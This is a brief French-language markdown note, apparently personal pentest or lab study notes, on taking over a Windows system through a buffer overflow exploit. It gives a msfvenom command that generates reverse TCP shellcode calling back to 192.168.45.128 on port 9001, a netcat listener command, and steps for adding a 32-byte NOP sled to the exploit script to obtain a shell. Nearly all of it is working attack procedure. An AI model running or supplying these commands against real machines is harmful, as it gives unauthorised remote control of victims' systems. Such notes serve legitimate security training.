# Utiliser pour prendre main sur le system

Generer un payload avec msfvenom

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.128 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"
```

Demarrer un netcat sur le port

```sh
nc -nlvp 9001
```

modifier le script avec la sortie de msfvenom et ajouter des nopms 
(`"\x90" * 32`) au shell code

les nopms ne representent aucune operation elle permet juste d'ajouter un espace entre le `saut (jump)` et le `payload`

> Lancer le script et obtenir le shell
